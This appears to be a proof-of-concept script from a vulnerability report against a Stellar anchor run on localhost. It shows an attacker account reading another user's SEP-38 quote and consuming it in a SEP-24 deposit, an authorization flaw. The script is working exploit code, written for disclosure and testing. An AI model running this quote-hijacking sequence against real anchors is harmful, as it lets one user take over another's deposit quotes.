import json, requests
from stellar_sdk import Keypair, TransactionEnvelope, Network
BASE="http://localhost:8080"
def jwt(kp):
    r=requests.get(BASE+"/auth",params={"account":kp.public_key,"home_domain":"localhost:8080"}); r.raise_for_status()
    env=TransactionEnvelope.from_xdr(r.json()["transaction"],Network.TESTNET_NETWORK_PASSPHRASE); env.sign(kp)
    r=requests.post(BASE+"/auth",json={"transaction":env.to_xdr()}); r.raise_for_status(); return r.json()["token"]
print("=== Report 03: SEP-38 quote consumed by a non-creator ===")
V=Keypair.random(); A=Keypair.random(); tv=jwt(V); ta=jwt(A)
print("victim  G =",V.public_key); print("attacker G =",A.public_key)
info=requests.get(BASE+"/sep38/info").json()
usdc=[a for a in info["assets"] if a["asset"].startswith("stellar:USDC")][0]["asset"]
q={"sell_asset":"iso4217:USD","buy_asset":usdc,"sell_amount":"10","context":"sep24"}
r=requests.post(BASE+"/sep38/quote",headers={"Authorization":"Bearer "+tv},json=q); print("victim POST /sep38/quote ->",r.status_code,r.text[:200]); Q=r.json()["id"]
r=requests.get(BASE+"/sep38/quote/"+Q,headers={"Authorization":"Bearer "+ta}); print("attacker GET /sep38/quote/<Q> ->",r.status_code,r.text)
r=requests.post(BASE+"/sep24/transactions/deposit/interactive",headers={"Authorization":"Bearer "+ta},json={"asset_code":"USDC","source_asset":"iso4217:USD","amount":"10","quote_id":Q})
print("attacker SEP-24 deposit with quote_id=<Q> ->",r.status_code,r.text[:160]); 
r=requests.post(BASE+"/sep24/transactions/deposit/interactive",headers={"Authorization":"Bearer "+tv},json={"asset_code":"USDC","source_asset":"iso4217:USD","amount":"10","quote_id":Q})
print("victim   SEP-24 deposit with own quote_id ->",r.status_code,r.text[:160])
r=requests.get(BASE+"/sep38/quote/"+Q,headers={"Authorization":"Bearer "+tv}); print("victim GET /sep38/quote/<Q> ->",r.status_code,r.text[:300])
